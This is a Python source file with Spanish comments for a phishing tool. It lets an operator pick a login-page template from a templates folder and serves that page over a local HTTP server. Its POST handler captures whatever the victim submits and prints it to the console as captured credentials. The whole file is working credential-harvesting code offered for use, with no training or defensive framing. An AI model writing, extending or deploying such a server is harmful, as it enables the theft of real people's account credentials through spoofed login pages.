import os
import http.server
import socketserver
import threading
import sys
from utils.colors import Colors

# Carpeta de plantillas
TEMPLATES_DIR = "templates"

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Sirve el archivo index.html de la plantilla seleccionada
        if self.path == "/":
            self.path = "/index.html"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        # Captura las credenciales enviadas por el formulario
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"{Colors.BOLD}{Colors.OKGREEN}Credenciales capturadas: {post_data}{Colors.ENDC}", flush=True)  # Forzar el vaciado del buffer
        self.send_response(200)
        self.end_headers()

def list_templates():
    # Lista las plantillas disponibles en la carpeta templates
    templates = [name for name in os.listdir(TEMPLATES_DIR) if os.path.isdir(os.path.join(TEMPLATES_DIR, name))]
    return templates

def select_template():
    # Muestra un menú para seleccionar una plantilla
    templates = list_templates()
    print(f"{Colors.BOLD}{Colors.OKBLUE}Plantillas disponibles:{Colors.ENDC}")
    for i, template in enumerate(templates):
        print(f"{Colors.OKGREEN}{i + 1}. {template}{Colors.ENDC}")
    choice = input(f"{Colors.BOLD}{Colors.WARNING}Selecciona una plantilla (1-{len(templates)}): {Colors.ENDC}")
    try:
        return templates[int(choice) - 1]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Selección no válida. Usando plantilla por defecto.{Colors.ENDC}", flush=True)
        return "default"

def start_phishing_server(template):
    # Cambia al directorio de la plantilla seleccionada
    os.chdir(os.path.join(TEMPLATES_DIR, template))
    port = 8000
    with socketserver.TCPServer(("", port), PhishingHandler) as httpd:
        print(f"{Colors.BOLD}{Colors.OKBLUE}\n\nServidor de phishing iniciado en http://localhost:{port}{Colors.ENDC}", flush=True)
        print(f"{Colors.BOLD}{Colors.WARNING}Presiona Ctrl+C para detener el servidor.{Colors.ENDC}", flush=True)
        httpd.serve_forever()

def phishing():
    template = select_template()
    print(f"{Colors.BOLD}{Colors.OKBLUE}Usando plantilla: {template}{Colors.ENDC}", flush=True)
    server_thread = threading.Thread(target=start_phishing_server, args=(template,))
    server_thread.daemon = True
    server_thread.start()
    input(f"{Colors.BOLD}{Colors.WARNING}Presiona Enter para detener el servidor...{Colors.ENDC}")